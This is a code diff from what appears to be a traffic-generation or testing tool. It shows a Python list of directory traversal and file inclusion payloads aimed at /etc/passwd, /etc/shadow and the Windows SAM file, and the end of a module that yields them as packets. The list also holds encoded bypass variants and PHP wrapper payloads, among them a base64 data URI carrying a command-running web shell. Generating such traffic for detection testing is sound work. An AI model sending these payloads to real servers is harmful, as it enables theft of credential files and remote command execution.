@@ -15,53 +15,43 @@ DIRECTORY_TRAVERSAL_PAYLOADS = [
     "../../../../../etc/passwd",
     "../../../../../../etc/passwd",
     "../../../../../../../etc/passwd",
-
     # Windows paths
     "..\\..\\..\\windows\\system32\\config\\sam",
     "..\\..\\..\\windows\\win.ini",
     "..\\..\\..\\boot.ini",
-
     # Null byte injection (legacy)
     "../../../etc/passwd%00",
     "../../../etc/passwd%00.jpg",
     "../../../etc/passwd%00.html",
-
     # Double encoding
     "..%252f..%252f..%252fetc/passwd",
     "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
     "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
-
     # URL encoding variations
     "..%c0%af..%c0%af..%c0%afetc/passwd",
     "..%c1%9c..%c1%9c..%c1%9cetc/passwd",
     "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
-
     # Unicode/UTF-8 encoding
     "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
     "..%u2215..%u2215..%u2215etc/passwd",
-
     # Double dot variations
     "....//....//....//etc/passwd",
     "..../..../..../etc/passwd",
     "....\\....\\....\\windows\\system32\\config\\sam",
-
     # Mixed encoding
     "..%5c..%5c..%5cetc/passwd",
     "%2e%2e%5c%2e%2e%5c%2e%2e%5cetc/passwd",
-
     # Absolute path
     "/etc/passwd",
     "/etc/shadow",
     "/proc/self/environ",
     "/var/log/apache2/access.log",
     "file:///etc/passwd",
-
     # LFI with wrappers (PHP specific)
     "php://filter/convert.base64-encode/resource=../../../etc/passwd",
     "php://input",
     "expect://id",
     "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
-
     # Path normalization bypass
     "/var/www/../../etc/passwd",
     "./../../etc/passwd",
@@ -149,5 +139,3 @@ class DirectoryTraversalModule(TrafficModule):
         )
 
         yield packet
-
-
